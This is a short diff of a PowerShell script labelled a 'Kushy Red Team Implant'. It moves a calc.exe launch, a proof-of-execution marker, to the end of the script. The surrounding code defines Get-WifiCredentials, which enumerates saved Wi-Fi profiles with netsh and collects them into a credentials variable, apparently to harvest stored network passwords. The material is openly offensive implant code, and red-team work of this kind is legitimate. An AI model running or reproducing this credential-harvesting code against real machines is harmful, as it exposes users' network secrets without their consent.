@@ -1,5 +1,4 @@
 Write-Host "Hello World from Kushy Red Team Implant"
-Start-Process calc.exe
 
 function Get-WifiCredentials {
     netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {
@@ -17,3 +16,4 @@ function Get-WifiCredentials {
 }
 
 $credentials = Get-WifiCredentials
+Start-Process calc.exe
